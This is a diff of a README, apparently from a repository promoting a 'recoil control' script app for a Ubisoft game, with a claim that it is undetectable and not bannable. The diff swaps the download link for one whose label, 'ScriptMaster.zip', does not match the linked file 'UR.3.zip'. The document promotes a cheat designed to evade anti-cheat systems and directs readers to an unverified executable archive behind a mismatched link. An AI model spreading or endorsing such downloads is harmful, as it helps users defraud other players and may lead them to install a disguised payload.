@@ -5,7 +5,8 @@ Make sure you click on the README.md for clearer Instructions
 _____________________________________________
 I have also instructed a video that i Recommend you watch it will show you how to download the recoil control app and also how to download and impliment the scripts for in game use but so far as of the time this post has been made the current app is undetectable by ubisoft and isnt currently bannable.
 _____________________________________________
-Script Managing Software Download [RecoilMaster.zip](https://github.com/user-attachments/files/20576556/RecoilMaster.zip)
+Script Managing Software Download [ScriptMaster.zip](https://github.com/user-attachments/files/20576646/UR.3.zip)
+
 _____________________________________________
 Please Understand the Script Master app was not created by me however the custom setting that will be provided are 
 _____________________________________________
